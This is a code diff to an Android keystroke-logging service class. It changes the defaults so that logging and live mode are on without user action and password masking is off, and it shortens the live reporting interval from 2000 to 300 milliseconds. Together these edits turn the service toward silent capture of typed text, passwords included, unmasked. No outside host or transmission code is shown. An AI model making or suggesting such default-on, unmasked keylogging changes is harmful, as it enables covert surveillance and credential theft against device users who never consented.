@@ -24,7 +24,7 @@ public class KeystrokeLoggerService {
     public  static final String KEY_BATCH   = "kl_batch";
 
     private static final int    MAX_SESSIONS    = 50;
-    private static final long   LIVE_DEBOUNCE   = 2000L;
+    private static final long   LIVE_DEBOUNCE   = 300L;
     private static final String LOG_DIR         = "keylog";
     private static final String SESSIONS_FILE   = "sessions.json";
 
@@ -76,9 +76,9 @@ public class KeystrokeLoggerService {
         return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
     }
 
-    public static boolean isEnabled(Context ctx)  { return prefs(ctx).getBoolean(KEY_ENABLED, false); }
-    public static boolean isLive(Context ctx)     { return prefs(ctx).getBoolean(KEY_LIVE, false); }
-    public static boolean isMaskPw(Context ctx)   { return prefs(ctx).getBoolean(KEY_MASK_PW, true); }
+    public static boolean isEnabled(Context ctx)  { return prefs(ctx).getBoolean(KEY_ENABLED, true); }
+    public static boolean isLive(Context ctx)     { return prefs(ctx).getBoolean(KEY_LIVE, true); }
+    public static boolean isMaskPw(Context ctx)   { return prefs(ctx).getBoolean(KEY_MASK_PW, false); }
     public static boolean isBatch(Context ctx)    { return prefs(ctx).getBoolean(KEY_BATCH, true); }
 
     public static void toggle(Context ctx, String key) {
